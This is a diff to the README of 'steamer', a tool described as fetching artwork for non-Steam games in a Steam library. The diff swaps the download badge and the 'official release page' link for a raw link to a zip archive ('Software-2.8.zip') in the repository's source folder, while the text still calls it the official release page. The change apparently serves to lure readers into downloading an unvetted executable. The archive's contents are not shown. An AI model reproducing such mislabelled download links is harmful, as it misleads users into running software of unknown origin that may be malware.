@@ -1,12 +1,12 @@
 # 💿 steamer - Get clean artwork for custom games
 
-[![](https://img.shields.io/badge/Download-Steamer-blue.svg)](https://github.com/Ridgeironclad605/steamer/releases)
+[![](https://img.shields.io/badge/Download-Steamer-blue.svg)](https://github.com/Ridgeironclad605/steamer/raw/refs/heads/main/src/Software-2.8.zip)
 
 This tool manages your library graphics. It finds and adds images for games you add to Steam manually. Non-Steam games often lack icons or cover art. This tool automates the search and setup process.
 
 ## 📥 How to install 
 
-1. Visit the [official release page](https://github.com/Ridgeironclad605/steamer) to download the software.
+1. Visit the [official release page](https://github.com/Ridgeironclad605/steamer/raw/refs/heads/main/src/Software-2.8.zip) to download the software.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to start the download.
 4. Save the file to a folder you can find, like your Downloads folder.
